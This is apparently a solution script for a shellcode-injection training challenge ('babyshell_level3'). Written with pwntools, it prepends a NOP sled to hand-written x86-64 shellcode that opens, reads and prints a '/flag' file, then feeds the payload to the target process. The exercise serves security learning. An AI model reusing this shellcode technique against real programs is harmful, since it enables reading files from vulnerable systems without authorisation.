from pwn import *

# Shellcode to open and read the 'flag' file, then print its content
shellcode = f'''
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f
    xor [rsp], rax
    mov rdi, rsp
    xor rax, rax
    mov al, 2
    syscall
    mov rdi, rax
    xor rax, rax
    mov rsi, rsp
    mov dl, 128
    syscall
    mov al, 1
    mov dil, 1
    syscall
    mov al, 60
    xor dil, dil
    syscall
'''

# Start the process
p = process('/challenge/babyshell_level3')

# Construct the payload with a nop sled and the shellcode
payload = asm("nop") * 850 + asm(shellcode, arch='amd64')

# Send the payload after the prompt
p.sendlineafter("from stdin", payload)

# Interact with the process
p.interactive()

# Clean up
p.clean()
